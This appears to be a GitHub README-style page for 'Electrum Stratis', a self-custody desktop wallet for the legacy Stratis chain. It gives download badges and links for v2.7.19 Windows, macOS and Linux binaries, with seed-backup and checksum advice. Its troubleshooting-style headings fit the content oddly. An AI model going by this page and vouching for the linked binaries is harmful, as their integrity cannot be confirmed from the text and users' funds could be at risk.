![Electrum-Stratis](assets/banner-article.png)

# What Electrum Stratis actually is

<p align="center">A desktop wallet for the legacy Stratis chain, forked from Electrum</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis is a free, open-source desktop wallet for the legacy Stratis chain, built as a fork of the Electrum codebase and licensed MIT. It generates and encrypts keys on your own machine, connects to the chain through public servers, and holds nothing on a server side. There is no account, no sign-up and no custodian. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Question | Short answer |
|---|---|
| Is this the same as Electrum? | Same code lineage, different coin, different maintainers |
| Does it need an account? | No account, no email, no phone |
| Where are the keys? | On your machine, encrypted with your password |
| Which coins does it hold? | Legacy STRAT only, not STRAX |
| Which systems? | Windows, macOS and Linux desktop |

</div>

It is a wallet in the original sense: a program that holds keys and signs transactions. Everything else - balances, history, addresses - is derived from the chain through a server connection, which is why a wallet with no peers looks empty.

## Why it happens

The design follows from one decision: keys never leave the machine. Electrum's architecture is a light client - it downloads headers, asks servers for the transactions that concern its own addresses, and signs locally. That gives fast startup without a full node, at the cost of trusting a server not to lie about what it shows you. A balance-verification view exists precisely to check that trust: it compares the local total with an independent source and displays the difference.

The fork exists because the legacy Stratis chain needs its own coin parameters: a P2PKH prefix of 63 producing addresses that begin with S, a P2SH prefix of 125, its own extended-key prefixes, and a coinbase maturity of 50 blocks. A Bitcoin wallet cannot read Stratis addresses any more than a Stratis wallet can read Bitcoin's, even though the code is nearly identical.

The name carries one clarification: Electrum Stratis is an independent fork with its own maintainers, its own release page and no shared support channel. The lineage is code, not organisation.

## Fix

1. **Download only from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).** The build and its published checksum come from the same place; anywhere else is unverifiable.
2. **Create a wallet and write down the seed.** The backup wizard shows it once and verifies it by re-entry, because a backup you have not proven is not a backup - the [Electrum Stratis backup models](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md) explain why the file alone is not enough.
3. **Set a passphrase you can retype.** It encrypts the local file; there is no reset if it is lost, only the seed route back.
4. **Let it sync, then confirm the height.** A wallet that has not reached the current height will show an incomplete history, which is normal on first run and misleading if you do not expect it.
5. **Label what the wallet is for.** Legacy STRAT, this machine, this date. The label matters most when you come back to it in a year.

Everything else - receiving, sending, staking, sweeping an old key - is a variation on those five steps, and each has its own procedure.

## If that did not work

If the wallet starts but never connects, the problem is the peer connection rather than the installation, and reinstalling will not change it. If it connects but shows nothing, the wallet is either behind the chain or looking at a different wallet.

If a downloaded file will not run at all, the build is either for another operating system or damaged in transit; re-download and compare the checksum before trying anything else.

If a "Stratis wallet" you found elsewhere asks for a seed or a fee, it is not this wallet. The name is used by lookalikes, and the only defence is to start from the release page rather than from a search result.

## Prevention

- Keep the release page bookmarked and download from the bookmark.
- Verify the checksum on every download, including updates.
- Keep the seed on paper, in two places, and test a restore once.
- Never type a seed into a website, a chat or a browser extension.
- Re-read the legacy-chain banner if you are unsure which asset the wallet holds.
- Verify the build you run: the project is actively maintained, and the release page is where that is visible.

## FAQ

### What is Electrum Stratis?

A desktop wallet for the legacy Stratis chain, forked from Electrum and released under the MIT licence. It is self-custody: keys are generated and encrypted locally, and the wallet connects to public servers to read the chain.

### How does the Electrum Stratis wallet work?

It stores your encrypted keys, derives your addresses from them, asks servers for the transactions touching those addresses, and signs transfers locally with your password. Balances and history are reconstructed from the chain, not stored in a database you have to trust.

### What are blockchain wallets, in this context?

A program that controls keys and signs transactions. It does not hold coins; the coins are entries on the chain, and the wallet is the thing that proves you may move them. That is why a wallet can be reinstalled, restored or copied without moving any funds.

### Is it the same product as Electrum?

No. It shares the codebase and much of the interface, and it is a separate project with its own maintainers, its own coin and no endorsement from Electrum Technologies. Anyone claiming otherwise is misdescribing the relationship.

<!-- DOWNLOAD-BLOCK -->

A five-minute test tells you whether this is the tool you need. Open the release page and note the tag. Download one asset and hash it. Install, launch, and watch whether it reaches a block height. If all four steps succeed, the wallet is doing exactly what it claims; if the height stalls, the problem is a peer, not the product.

## Related articles

- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
